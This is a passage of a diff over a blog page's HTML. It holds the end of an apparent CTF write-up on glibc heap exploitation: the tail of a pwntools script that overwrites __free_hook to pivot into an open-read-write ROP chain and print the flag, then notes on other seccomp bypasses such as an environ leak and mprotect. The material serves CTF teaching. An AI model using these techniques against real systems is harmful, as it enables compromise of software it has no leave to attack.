__free_hook To Pivot Gadget&quot;</span>)</span><br><span class="line">progress.status(<span class="string">&quot;End __free_hook Overwrite&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger ROP</span></span><br><span class="line">io.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;index: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;rop_pad&#125;</span>&quot;</span>.encode())</span><br><span class="line">progress.success(<span class="string">&quot;ORW ROP Chain Completed&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = io.recvline().decode()</span><br><span class="line">log.success(<span class="string">&quot;Flag: &quot;</span> + flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+<p>There are of course many modifications available, such as using library functions instead of syscall, using many small chunks to house the ROP chain, not calling <code>exit</code> and make your exploit ugly etc, but the crux is similar.</p>
+<h2 id="Alternatives"><a href="#Alternatives" class="headerlink" title="Alternatives"></a>Alternatives</h2><p>Depending on the amount of control, there are many more methods to bypass seccomp.</p>
+<ul>
+<li>If you have an arbitrary write primitive, one method will be to leak stack addresses using the <code>environ</code> variable, locate the return address and just write ROP chain on the stack.</li>
+<li>If the sandbox permits, use an <code>mprotect</code> call to mark the heap as executable and pwn it the 90s way.</li>
+<li>Social engineer the challenge creators</li>
+<li>Find a remote kernel 0day</li>
+</ul>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Hooks are things of the past! Filestream exploitation and glibc 0day is king<br>学无止境 谦卑而行</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -181,33 +223,112 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">HTB</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">browser</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">v8</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/12/23/orw-rop/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2021/11/27/house-of-pie/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux Heap Exploitation - House of Pie</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -230,9 +351,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
